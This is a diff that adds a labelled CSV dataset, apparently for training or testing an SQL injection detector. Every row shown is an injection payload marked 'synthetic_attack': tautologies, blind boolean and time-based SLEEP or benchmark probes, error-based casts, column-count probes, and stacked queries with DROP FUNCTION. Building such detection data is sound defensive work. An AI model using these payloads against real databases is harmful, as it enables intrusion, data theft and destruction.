@@ -1,0 +1,1051 @@
+Sentence,Label,source
+""" AND 'RVeu'='RVeu' --",1,synthetic_attack
+""" AND 'aaRQ'='aaRQ' --",1,synthetic_attack
+""" AND ('DuXG' LIKE 'DuXG",1,synthetic_attack
+""" AND ('OdJc' LIKE 'OdJc",1,synthetic_attack
+""" AND ('XEgz' LIKE 'XEgz",1,synthetic_attack
+""" AND (CASE WHEN 4248=7705 THEN 4248 ELSE NULL END)",1,synthetic_attack
+""" AND (CASE WHEN 6357=9315 THEN 6357 ELSE NULL END)",1,synthetic_attack
+""" AND (SELECT 1773 FROM (SELECT(SLEEP(6)))x)",1,synthetic_attack
+""" AND (SELECT 3388 FROM (SELECT(SLEEP(8)))x)",1,synthetic_attack
+""" AND 1364=5007 AND 'Mrvq'='UVGE",1,synthetic_attack
+""" AND 1566=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" AND 1795=1795 ORDER BY 21",1,synthetic_attack
+""" AND 1=1 #",1,synthetic_attack
+""" AND 2458=7075 AND 'VGkj'='wskH",1,synthetic_attack
+""" AND 2594=LIKE('cHKD',UPPER(HEX(RANDOMBLOB(3884))))",1,synthetic_attack
+""" AND 3024=3024 ORDER BY 29--",1,synthetic_attack
+""" AND 3272=3272 AND (9924=9924",1,synthetic_attack
+""" AND 3752=3752 AND 'UNEi'='UNEi",1,synthetic_attack
+""" AND 3756=3756 AND (2806=2806",1,synthetic_attack
+""" AND 3901=(CASE WHEN (3901=3901) THEN 3901 ELSE 1/(SELECT 0) END)",1,synthetic_attack
+""" AND 3912=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+""" AND 4276=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" AND 4593=4593 ORDER BY 14--",1,synthetic_attack
+""" AND 5091=5091 AND 'BwGm'='BwGm",1,synthetic_attack
+""" AND 5127=(CASE WHEN (5127=5127) THEN 5127 ELSE 1/(SELECT 0) END)",1,synthetic_attack
+""" AND 7186=7186 AND (6588=6588",1,synthetic_attack
+""" AND 7260=7323 AND 'Wzbz'='whIa",1,synthetic_attack
+""" AND 7998=4121 AND 'fMUN'='EgGK",1,synthetic_attack
+""" AND 8059=8059 AND (6828=6828",1,synthetic_attack
+""" AND 8233=8233 ORDER BY 11#",1,synthetic_attack
+""" AND 8296=(CASE WHEN (8296=8296) THEN 8296 ELSE 1/(SELECT 0) END)",1,synthetic_attack
+""" AND 8638=8638 ORDER BY 29#",1,synthetic_attack
+""" AND 8661=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" AND 9597=LIKE('ZYov',UPPER(HEX(RANDOMBLOB(6005))))",1,synthetic_attack
+""" AND a='a",1,synthetic_attack
+""" HAVING 0=0",1,synthetic_attack
+""" HAVING 0=1",1,synthetic_attack
+""" HAVING 1=0",1,synthetic_attack
+""" HAVING 1=1",1,synthetic_attack
+""" OR 'HnHk'='HnHk' --",1,synthetic_attack
+""" OR 'NzZx'='NzZx' --",1,synthetic_attack
+""" OR 'eZal'='eZal' --",1,synthetic_attack
+""" OR 'sUOh'='sUOh' --",1,synthetic_attack
+""" OR 'wKlP'='wKlP' --",1,synthetic_attack
+""" OR ('VUWy' LIKE 'VUWy",1,synthetic_attack
+""" OR ('hZEA' LIKE 'hZEA",1,synthetic_attack
+""" OR ('jGdk' LIKE 'jGdk",1,synthetic_attack
+""" OR (CASE WHEN 2414=4720 THEN 2414 ELSE NULL END)",1,synthetic_attack
+""" OR (CASE WHEN 4334=6046 THEN 4334 ELSE NULL END)",1,synthetic_attack
+""" OR (CASE WHEN 4592=5636 THEN 4592 ELSE NULL END)",1,synthetic_attack
+""" OR (SELECT 9143 FROM (SELECT(SLEEP(5)))x)",1,synthetic_attack
+""" OR 1068=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" OR 1143=9637 OR 'ANKA'='wpAM",1,synthetic_attack
+""" OR 1167=1167 ORDER BY 15#",1,synthetic_attack
+""" OR 1347=1347 OR 'TrHB'='TrHB",1,synthetic_attack
+""" OR 1528=1528 ORDER BY 19#",1,synthetic_attack
+""" OR 1599=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" OR 1=1 #",1,synthetic_attack
+""" OR 2395=8172 OR 'xfkn'='FJIP",1,synthetic_attack
+""" OR 2592=2592 OR (7766=7766",1,synthetic_attack
+""" OR 3096=3096 OR (5650=5650",1,synthetic_attack
+""" OR 3136=2540 OR 'sieU'='WZEb",1,synthetic_attack
+""" OR 3780=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+""" OR 3896=3896 OR 'fjKH'='fjKH",1,synthetic_attack
+""" OR 4005=4005 ORDER BY 2#",1,synthetic_attack
+""" OR 4200=(CASE WHEN (4200=4200) THEN 4200 ELSE 1/(SELECT 0) END)",1,synthetic_attack
+""" OR 4643=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" OR 4769=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+""" OR 4799=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" OR 5431=5431 ORDER BY 19#",1,synthetic_attack
+""" OR 5742=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+""" OR 5776=5776 OR 'UFCG'='UFCG",1,synthetic_attack
+""" OR 5933=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" OR 6135=(CASE WHEN (6135=6135) THEN 6135 ELSE 1/(SELECT 0) END)",1,synthetic_attack
+""" OR 6177=8550 OR 'MZmx'='DHik",1,synthetic_attack
+""" OR 6317=(CASE WHEN (6317=6317) THEN 6317 ELSE 1/(SELECT 0) END)",1,synthetic_attack
+""" OR 6344=6344 OR (8730=8730",1,synthetic_attack
+""" OR 6644=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" OR 7466=1134 OR 'Ubhy'='gLhi",1,synthetic_attack
+""" OR 7669=7669 OR (1854=1854",1,synthetic_attack
+""" OR 7723=(CASE WHEN (7723=7723) THEN 7723 ELSE 1/(SELECT 0) END)",1,synthetic_attack
+""" OR 8802=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" OR 9020=9020 OR (1238=1238",1,synthetic_attack
+""" OR 9075=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+""" OR 9122=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" OR 9338=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" OR 9398=3876 OR 'hPsS'='vGAO",1,synthetic_attack
+""" OR 9859=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+""" OR a='a",1,synthetic_attack
+""" ORDER BY 10,SLEEP(3)#",1,synthetic_attack
+""" ORDER BY 10,SLEEP(5)",1,synthetic_attack
+""" ORDER BY 11,SLEEP(6)--",1,synthetic_attack
+""" ORDER BY 16,SLEEP(6)",1,synthetic_attack
+""" ORDER BY 18,SLEEP(8)#",1,synthetic_attack
+""" ORDER BY 2,SLEEP(1)#",1,synthetic_attack
+""" ORDER BY 20,SLEEP(3)",1,synthetic_attack
+""" ORDER BY 24,SLEEP(5)--",1,synthetic_attack
+""" ORDER BY 29,SLEEP(3)--",1,synthetic_attack
+""" ORDER BY 29,SLEEP(5)--",1,synthetic_attack
+""" ORDER BY 7,SLEEP(1)--",1,synthetic_attack
+""" ORDER BY 9,SLEEP(8)#",1,synthetic_attack
+""" ORDER BY 9,SLEEP(8)--",1,synthetic_attack
+""" ORDER BY SLEEP(2)--",1,synthetic_attack
+""" ORDER BY SLEEP(3)#",1,synthetic_attack
+""" ORDER BY SLEEP(3)--",1,synthetic_attack
+""" ORDER BY SLEEP(7)--",1,synthetic_attack
+""" ORDER BY SLEEP(8)#",1,synthetic_attack
+""" ORDER BY SLEEP(8)--",1,synthetic_attack
+""" ORDER BY SLEEP(9)",1,synthetic_attack
+""" ORDER BY SLEEP(9)--",1,synthetic_attack
+""" and 'EwJF'='EwJF' --",1,synthetic_attack
+""" and 'YWyF'='YWyF' --",1,synthetic_attack
+""" and 'Zvef'='Zvef' --",1,synthetic_attack
+""" and ('UmWR' LIKE 'UmWR",1,synthetic_attack
+""" and ('dnIP' LIKE 'dnIP",1,synthetic_attack
+""" and (CASE WHEN 2866=1545 THEN 2866 ELSE NULL END)",1,synthetic_attack
+""" and (CASE WHEN 3549=4670 THEN 3549 ELSE NULL END)",1,synthetic_attack
+""" and (CASE WHEN 4042=7098 THEN 4042 ELSE NULL END)",1,synthetic_attack
+""" and (CASE WHEN 4223=1160 THEN 4223 ELSE NULL END)",1,synthetic_attack
+""" and (CASE WHEN 5717=9110 THEN 5717 ELSE NULL END)",1,synthetic_attack
+""" and (CASE WHEN 9393=6531 THEN 9393 ELSE NULL END)",1,synthetic_attack
+""" and (SELECT 4097 FROM (SELECT(SLEEP(4)))x)",1,synthetic_attack
+""" and (SELECT 9509 FROM (SELECT(SLEEP(8)))x)",1,synthetic_attack
+""" and 1348=1348 and 'hYbF'='hYbF",1,synthetic_attack
+""" and 1640=1640 ORDER BY 11--",1,synthetic_attack
+""" and 1=1 #",1,synthetic_attack
+""" and 3241=LIKE('FlDs',UPPER(HEX(RANDOMBLOB(7935))))",1,synthetic_attack
+""" and 3323=3323 and 'pCHy'='pCHy",1,synthetic_attack
+""" and 3469=LIKE('dHaG',UPPER(HEX(RANDOMBLOB(2244))))",1,synthetic_attack
+""" and 4501=LIKE('evdn',UPPER(HEX(RANDOMBLOB(2799))))",1,synthetic_attack
+""" and 4567=4567 and (6172=6172",1,synthetic_attack
+""" and 4815=2953 and 'dmML'='mexG",1,synthetic_attack
+""" and 4910=4910 and 'opvi'='opvi",1,synthetic_attack
+""" and 5343=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+""" and 6168=6168 and 'ADVC'='ADVC",1,synthetic_attack
+""" and 6210=LIKE('Kesj',UPPER(HEX(RANDOMBLOB(4258))))",1,synthetic_attack
+""" and 7463=7463 and 'zzFZ'='zzFZ",1,synthetic_attack
+""" and 7638=7638 ORDER BY 29#",1,synthetic_attack
+""" and 8153=LIKE('mEwD',UPPER(HEX(RANDOMBLOB(7448))))",1,synthetic_attack
+""" and 8223=LIKE('hUVV',UPPER(HEX(RANDOMBLOB(2746))))",1,synthetic_attack
+""" and 8451=2467 and 'MAQF'='XcbW",1,synthetic_attack
+""" and 8569=3609 and 'MeAI'='HpmC",1,synthetic_attack
+""" and 8821=8821 ORDER BY 19--",1,synthetic_attack
+""" and 8825=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+""" and 9165=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" and 9179=(CASE WHEN (9179=9179) THEN 9179 ELSE 1/(SELECT 0) END)",1,synthetic_attack
+""" and a='a",1,synthetic_attack
+""" or 'PEnc'='PEnc' --",1,synthetic_attack
+""" or 'WILs'='WILs' --",1,synthetic_attack
+""" or 'oWvJ'='oWvJ' --",1,synthetic_attack
+""" or 'otfQ'='otfQ' --",1,synthetic_attack
+""" or 'reNZ'='reNZ' --",1,synthetic_attack
+""" or ('LQwS' LIKE 'LQwS",1,synthetic_attack
+""" or ('hcVj' LIKE 'hcVj",1,synthetic_attack
+""" or (CASE WHEN 3222=9917 THEN 3222 ELSE NULL END)",1,synthetic_attack
+""" or (CASE WHEN 3625=7408 THEN 3625 ELSE NULL END)",1,synthetic_attack
+""" or (CASE WHEN 5637=2122 THEN 5637 ELSE NULL END)",1,synthetic_attack
+""" or (CASE WHEN 6107=5289 THEN 6107 ELSE NULL END)",1,synthetic_attack
+""" or (CASE WHEN 9696=4071 THEN 9696 ELSE NULL END)",1,synthetic_attack
+""" or (SELECT 1252 FROM (SELECT(SLEEP(4)))x)",1,synthetic_attack
+""" or (SELECT 8399 FROM (SELECT(SLEEP(3)))x)",1,synthetic_attack
+""" or 1832=1832 ORDER BY 26",1,synthetic_attack
+""" or 1=1 #",1,synthetic_attack
+""" or 3658=LIKE('TZOc',UPPER(HEX(RANDOMBLOB(9825))))",1,synthetic_attack
+""" or 4321=(CASE WHEN (4321=4321) THEN 4321 ELSE 1/(SELECT 0) END)",1,synthetic_attack
+""" or 4637=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" or 5722=5722 or 'nFWi'='nFWi",1,synthetic_attack
+""" or 6580=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" or 6643=6643 or (3131=3131",1,synthetic_attack
+""" or 7315=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC)",1,synthetic_attack
+""" or 7627=(CASE WHEN (7627=7627) THEN 7627 ELSE 1/(SELECT 0) END)",1,synthetic_attack
+""" or 7809=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+""" or 8539=9459 or 'icVI'='kHVI",1,synthetic_attack
+""" or 8668=LIKE('QsQk',UPPER(HEX(RANDOMBLOB(9665))))",1,synthetic_attack
+""" or 8825=9194 or 'MqIj'='aTLZ",1,synthetic_attack
+""" or 9471=9471 or 'vVhu'='vVhu",1,synthetic_attack
+""" or a='a",1,synthetic_attack
+"""+benchmark(1548,SHA1(1))+'",1,synthetic_attack
+"""+benchmark(2603,SHA1(1))+'",1,synthetic_attack
+"""+benchmark(3155,SHA1(1))+'",1,synthetic_attack
+"""+benchmark(4707,SHA1(1))+'",1,synthetic_attack
+"""+benchmark(6004,SHA1(1))+'",1,synthetic_attack
+"""+benchmark(6550,SHA1(1))+'",1,synthetic_attack
+"""+benchmark(6921,SHA1(1))+'",1,synthetic_attack
+"""+benchmark(7705,SHA1(1))+'",1,synthetic_attack
+"""+benchmark(7842,SHA1(1))+'",1,synthetic_attack
+"""+benchmark(8465,SHA1(1))+'",1,synthetic_attack
+"""+benchmark(8840,SHA1(1))+'",1,synthetic_attack
+"""+benchmark(9084,SHA1(1))+'",1,synthetic_attack
+"""; IF(1384=1384) SELECT 1384 ELSE DROP FUNCTION eZTQ--",1,synthetic_attack
+"""; IF(1639=1639) SELECT 1639 ELSE DROP FUNCTION XJxj--",1,synthetic_attack
+"""; IF(1890=1890) SELECT 1890 ELSE DROP FUNCTION sJzX--",1,synthetic_attack
+"""; IF(2510=2510) SELECT 2510 ELSE DROP FUNCTION ZSsx--",1,synthetic_attack
+"""; IF(2637=2637) SELECT 2637 ELSE DROP FUNCTION xqcX--",1,synthetic_attack
+"""; IF(4098=4098) SELECT 4098 ELSE DROP FUNCTION fjjH--",1,synthetic_attack
+"""; IF(4627=4627) SELECT 4627 ELSE DROP FUNCTION tzTF--",1,synthetic_attack
+"""; IF(5374=5374) SELECT 5374 ELSE DROP FUNCTION DlkW--",1,synthetic_attack
+"""; IF(7602=7602) SELECT 7602 ELSE DROP FUNCTION Ajxr--",1,synthetic_attack
+"""; IF(7830=7830) SELECT 7830 ELSE DROP FUNCTION pIjg--",1,synthetic_attack
+"""; IF(7980=7980) SELECT 7980 ELSE DROP FUNCTION AWLT--",1,synthetic_attack
+"""; IF(8087=8087) SELECT 8087 ELSE DROP FUNCTION GDsS--",1,synthetic_attack
+"""; IF(9050=9050) SELECT 9050 ELSE DROP FUNCTION PVcU--",1,synthetic_attack
+"""; IF(9486=9486) SELECT 9486 ELSE DROP FUNCTION AeZl--",1,synthetic_attack
+"""; IF(9888=9888) SELECT 9888 ELSE DROP FUNCTION uliC--",1,synthetic_attack
+%' AND 'Ckxp'='Ckxp' --,1,synthetic_attack
+%' AND 'JDCT'='JDCT' --,1,synthetic_attack
+%' AND 'Woxt'='Woxt' --,1,synthetic_attack
+%' AND 'osrQ'='osrQ' --,1,synthetic_attack
+%' AND 'wVWW'='wVWW' --,1,synthetic_attack
+%' AND ('OHdf' LIKE 'OHdf,1,synthetic_attack
+%' AND ('amfu' LIKE 'amfu,1,synthetic_attack
+%' AND ('eUCY' LIKE 'eUCY,1,synthetic_attack
+%' AND (CASE WHEN 4655=1894 THEN 4655 ELSE NULL END),1,synthetic_attack
+%' AND (CASE WHEN 7532=7965 THEN 7532 ELSE NULL END),1,synthetic_attack
+%' AND (CASE WHEN 9746=3431 THEN 9746 ELSE NULL END),1,synthetic_attack
+%' AND (SELECT 1277 FROM (SELECT(SLEEP(9)))x),1,synthetic_attack
+%' AND (SELECT 7780 FROM (SELECT(SLEEP(3)))x),1,synthetic_attack
+%' AND (SELECT 8698 FROM (SELECT(SLEEP(3)))x),1,synthetic_attack
+%' AND 1413=8578 AND 'pzwO'='glsh,1,synthetic_attack
+"%' AND 1928=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+%' AND 1=1 #,1,synthetic_attack
+"%' AND 2323=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+%' AND 2357=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+%' AND 2530=2530 AND 'QAsy'='QAsy,1,synthetic_attack
+%' AND 2575=8527 AND 'zzpT'='ovrr,1,synthetic_attack
+%' AND 3446=8386 AND 'geOj'='QYrz,1,synthetic_attack
+%' AND 3558=3558 ORDER BY 15--,1,synthetic_attack
+%' AND 4370=4370 AND 'hccZ'='hccZ,1,synthetic_attack
+%' AND 4423=(CASE WHEN (4423=4423) THEN 4423 ELSE 1/(SELECT 0) END),1,synthetic_attack
+%' AND 4542=(CASE WHEN (4542=4542) THEN 4542 ELSE 1/(SELECT 0) END),1,synthetic_attack
+"%' AND 4830=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+%' AND 5057=(CASE WHEN (5057=5057) THEN 5057 ELSE 1/(SELECT 0) END),1,synthetic_attack
+"%' AND 5970=LIKE('xPwz',UPPER(HEX(RANDOMBLOB(2795))))",1,synthetic_attack
+%' AND 6158=6085 AND 'vqRY'='afmy,1,synthetic_attack
+"%' AND 6447=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+%' AND 6486=6486 ORDER BY 10--,1,synthetic_attack
+"%' AND 6746=LIKE('uWyA',UPPER(HEX(RANDOMBLOB(1600))))",1,synthetic_attack
+"%' AND 6898=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+%' AND 7143=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+%' AND 7344=7344 AND 'RfFi'='RfFi,1,synthetic_attack
+%' AND 7475=7475 AND 'vLGj'='vLGj,1,synthetic_attack
+%' AND 8679=(CASE WHEN (8679=8679) THEN 8679 ELSE 1/(SELECT 0) END),1,synthetic_attack
+"%' AND 8715=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+%' AND 8938=8938 AND (6230=6230,1,synthetic_attack
+%' AND 9148=9148 AND (6175=6175,1,synthetic_attack
+"%' AND 9852=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+%' AND a='a,1,synthetic_attack
+%' HAVING 0=0,1,synthetic_attack
+%' HAVING 0=1,1,synthetic_attack
+%' HAVING 1=0,1,synthetic_attack
+%' HAVING 1=1,1,synthetic_attack
+%' OR 'qnsG'='qnsG' --,1,synthetic_attack
+%' OR 'sYuB'='sYuB' --,1,synthetic_attack
+%' OR ('FlWs' LIKE 'FlWs,1,synthetic_attack
+%' OR ('RGXi' LIKE 'RGXi,1,synthetic_attack
+%' OR ('fyqw' LIKE 'fyqw,1,synthetic_attack
+%' OR (CASE WHEN 1094=2755 THEN 1094 ELSE NULL END),1,synthetic_attack
+%' OR (CASE WHEN 5787=4342 THEN 5787 ELSE NULL END),1,synthetic_attack
+%' OR (CASE WHEN 9428=8812 THEN 9428 ELSE NULL END),1,synthetic_attack
+%' OR (SELECT 5049 FROM (SELECT(SLEEP(9)))x),1,synthetic_attack
+%' OR (SELECT 9190 FROM (SELECT(SLEEP(3)))x),1,synthetic_attack
+%' OR (SELECT 9585 FROM (SELECT(SLEEP(3)))x),1,synthetic_attack
+"%' OR 1061=LIKE('TKrl',UPPER(HEX(RANDOMBLOB(6852))))",1,synthetic_attack
+"%' OR 1186=LIKE('ZmjE',UPPER(HEX(RANDOMBLOB(9388))))",1,synthetic_attack
+%' OR 1558=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+%' OR 1605=1605 ORDER BY 19--,1,synthetic_attack
+%' OR 1=1 #,1,synthetic_attack
+%' OR 2047=2047 ORDER BY 22--,1,synthetic_attack
+"%' OR 2916=LIKE('fzXe',UPPER(HEX(RANDOMBLOB(2215))))",1,synthetic_attack
+"%' OR 2948=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+%' OR 3073=(CASE WHEN (3073=3073) THEN 3073 ELSE 1/(SELECT 0) END),1,synthetic_attack
+%' OR 3557=(CASE WHEN (3557=3557) THEN 3557 ELSE 1/(SELECT 0) END),1,synthetic_attack
+%' OR 3612=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+%' OR 4617=(CASE WHEN (4617=4617) THEN 4617 ELSE 1/(SELECT 0) END),1,synthetic_attack
+"%' OR 4642=LIKE('GqqY',UPPER(HEX(RANDOMBLOB(3686))))",1,synthetic_attack
+%' OR 5065=1782 OR 'NflI'='siIq,1,synthetic_attack
+"%' OR 5218=LIKE('TzOW',UPPER(HEX(RANDOMBLOB(8915))))",1,synthetic_attack
+%' OR 5378=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+%' OR 5381=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+"%' OR 5617=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+%' OR 6107=6107 ORDER BY 19--,1,synthetic_attack
+%' OR 7372=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+"%' OR 7807=LIKE('rlBg',UPPER(HEX(RANDOMBLOB(9330))))",1,synthetic_attack
+"%' OR 8485=LIKE('WWIJ',UPPER(HEX(RANDOMBLOB(2551))))",1,synthetic_attack
+%' OR 9437=9437 ORDER BY 17--,1,synthetic_attack
+%' OR a='a,1,synthetic_attack
+"%' ORDER BY 11,SLEEP(2)--",1,synthetic_attack
+"%' ORDER BY 23,SLEEP(7)--",1,synthetic_attack
+"%' ORDER BY 24,SLEEP(2)--",1,synthetic_attack
+"%' ORDER BY 27,SLEEP(5)#",1,synthetic_attack
+"%' ORDER BY 4,SLEEP(1)--",1,synthetic_attack
+"%' ORDER BY 6,SLEEP(4)",1,synthetic_attack
+"%' ORDER BY 7,SLEEP(8)--",1,synthetic_attack
+%' ORDER BY SLEEP(1)--,1,synthetic_attack
+%' ORDER BY SLEEP(4)--,1,synthetic_attack
+%' ORDER BY SLEEP(5),1,synthetic_attack
+%' ORDER BY SLEEP(5)#,1,synthetic_attack
+%' ORDER BY SLEEP(6),1,synthetic_attack
+%' ORDER BY SLEEP(6)--,1,synthetic_attack
+%' ORDER BY SLEEP(8),1,synthetic_attack
+%' ORDER BY SLEEP(8)#,1,synthetic_attack
+%' ORDER BY SLEEP(8)--,1,synthetic_attack
+%' ORDER BY SLEEP(9)--,1,synthetic_attack
+%' and 'ALaS'='ALaS' --,1,synthetic_attack
+%' and 'ESZB'='ESZB' --,1,synthetic_attack
+%' and 'FmOy'='FmOy' --,1,synthetic_attack
+%' and 'bdzN'='bdzN' --,1,synthetic_attack
+%' and 'ybHC'='ybHC' --,1,synthetic_attack
+%' and ('KlEx' LIKE 'KlEx,1,synthetic_attack
+%' and ('SOGz' LIKE 'SOGz,1,synthetic_attack
+%' and (CASE WHEN 4408=5870 THEN 4408 ELSE NULL END),1,synthetic_attack
+%' and (CASE WHEN 5412=7179 THEN 5412 ELSE NULL END),1,synthetic_attack
+%' and (CASE WHEN 5671=1896 THEN 5671 ELSE NULL END),1,synthetic_attack
+%' and (SELECT 4817 FROM (SELECT(SLEEP(5)))x),1,synthetic_attack
+%' and (SELECT 5021 FROM (SELECT(SLEEP(1)))x),1,synthetic_attack
+%' and (SELECT 5716 FROM (SELECT(SLEEP(3)))x),1,synthetic_attack
+%' and (SELECT 6002 FROM (SELECT(SLEEP(1)))x),1,synthetic_attack
+%' and 1666=1666 and (5210=5210,1,synthetic_attack
+%' and 1963=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+%' and 1=1 #,1,synthetic_attack
+%' and 2133=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+%' and 2314=2314 and (9776=9776,1,synthetic_attack
+%' and 2692=2692 and (7442=7442,1,synthetic_attack
+%' and 3867=3867 and (2964=2964,1,synthetic_attack
+%' and 4342=4342 and (3210=3210,1,synthetic_attack
+%' and 4649=4649 and 'SJuF'='SJuF,1,synthetic_attack
+%' and 4849=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+%' and 5506=5506 and 'XMMG'='XMMG,1,synthetic_attack
+"%' and 5512=LIKE('ASSr',UPPER(HEX(RANDOMBLOB(4776))))",1,synthetic_attack
+%' and 5964=5964 ORDER BY 8,1,synthetic_attack
+"%' and 6420=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+%' and 7094=7094 and (3490=3490,1,synthetic_attack
+"%' and 7968=LIKE('Ztgp',UPPER(HEX(RANDOMBLOB(6791))))",1,synthetic_attack
+%' and 9392=4592 and 'CsGH'='fPPs,1,synthetic_attack
+"%' and 9654=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+%' and 9771=9771 and 'OhcJ'='OhcJ,1,synthetic_attack
+"%' and 9914=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+%' and a='a,1,synthetic_attack
+%' or 'IZKU'='IZKU' --,1,synthetic_attack
+%' or 'Tpcl'='Tpcl' --,1,synthetic_attack
+%' or 'wtYf'='wtYf' --,1,synthetic_attack
+%' or (CASE WHEN 7039=7811 THEN 7039 ELSE NULL END),1,synthetic_attack
+%' or (CASE WHEN 7155=6597 THEN 7155 ELSE NULL END),1,synthetic_attack
+%' or (CASE WHEN 7942=3518 THEN 7942 ELSE NULL END),1,synthetic_attack
+%' or (SELECT 2078 FROM (SELECT(SLEEP(8)))x),1,synthetic_attack
+%' or (SELECT 3981 FROM (SELECT(SLEEP(5)))x),1,synthetic_attack
+%' or 1207=3720 or 'hskk'='txgq,1,synthetic_attack
+%' or 1=1 #,1,synthetic_attack
+%' or 2504=1298 or 'PWAR'='FIpy,1,synthetic_attack
+"%' or 2755=LIKE('epOu',UPPER(HEX(RANDOMBLOB(5842))))",1,synthetic_attack
+%' or 2857=1354 or 'ZbmI'='Ezsv,1,synthetic_attack
+%' or 2937=(CASE WHEN (2937=2937) THEN 2937 ELSE 1/(SELECT 0) END),1,synthetic_attack
+%' or 3196=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+"%' or 3377=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+"%' or 3636=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+%' or 3910=3910 or 'UNsL'='UNsL,1,synthetic_attack
+"%' or 4159=LIKE('Ttfo',UPPER(HEX(RANDOMBLOB(2079))))",1,synthetic_attack
+%' or 4332=4332 ORDER BY 16,1,synthetic_attack
+%' or 4990=(CASE WHEN (4990=4990) THEN 4990 ELSE 1/(SELECT 0) END),1,synthetic_attack
+%' or 5256=5256 ORDER BY 23,1,synthetic_attack
+"%' or 5900=LIKE('ZskW',UPPER(HEX(RANDOMBLOB(1484))))",1,synthetic_attack
+%' or 6020=6020 or (7568=7568,1,synthetic_attack
+%' or 6738=6738 ORDER BY 2,1,synthetic_attack
+%' or 6809=6809 or 'wpfl'='wpfl,1,synthetic_attack
+%' or 7272=7272 or (4042=4042,1,synthetic_attack
+"%' or 7512=LIKE('UPrs',UPPER(HEX(RANDOMBLOB(6009))))",1,synthetic_attack
+%' or 8405=(CASE WHEN (8405=8405) THEN 8405 ELSE 1/(SELECT 0) END),1,synthetic_attack
+%' or 9290=9290 ORDER BY 18--,1,synthetic_attack
+"%' or 9727=LIKE('IOmY',UPPER(HEX(RANDOMBLOB(5246))))",1,synthetic_attack
+%' or a='a,1,synthetic_attack
+"%'+benchmark(1688,SHA1(1))+'",1,synthetic_attack
+"%'+benchmark(2463,SHA1(1))+'",1,synthetic_attack
+"%'+benchmark(4629,SHA1(1))+'",1,synthetic_attack
+"%'+benchmark(6141,SHA1(1))+'",1,synthetic_attack
+"%'+benchmark(7445,SHA1(1))+'",1,synthetic_attack
+"%'+benchmark(7832,SHA1(1))+'",1,synthetic_attack
+"%'+benchmark(7940,SHA1(1))+'",1,synthetic_attack
+"%'+benchmark(8372,SHA1(1))+'",1,synthetic_attack
+"%'+benchmark(8419,SHA1(1))+'",1,synthetic_attack
+"%'+benchmark(8670,SHA1(1))+'",1,synthetic_attack
+"%'+benchmark(9797,SHA1(1))+'",1,synthetic_attack
+%'; IF(1997=1997) SELECT 1997 ELSE DROP FUNCTION doiw--,1,synthetic_attack
+%'; IF(3391=3391) SELECT 3391 ELSE DROP FUNCTION ZjLK--,1,synthetic_attack
+%'; IF(3495=3495) SELECT 3495 ELSE DROP FUNCTION Ghhr--,1,synthetic_attack
